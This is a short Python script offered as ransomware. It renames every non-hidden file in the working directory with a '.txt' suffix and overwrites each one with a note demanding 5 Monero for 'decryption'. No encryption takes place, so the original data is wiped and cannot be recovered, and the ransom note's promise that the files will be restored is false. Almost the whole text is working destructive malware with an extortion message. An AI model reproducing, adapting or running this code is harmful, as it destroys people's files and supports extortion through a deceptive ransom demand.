import glob, os
 
def encrypt_files():
    for filename in glob.glob('*.*'):
        try:
            if not filename.startswith(".") and not os.path.isdir(filename):
                os.rename(filename, filename + ".txt")
                with open(filename + ".txt", "w") as f:
                    f.write("all ur files are encrypted want them back give me 5 monero(XMR) coin in this address\n(address)\nu have unlimited time to send the coins when i send the files will be automatically changed in to normal")
        except:
            pass
 
encrypt_files()
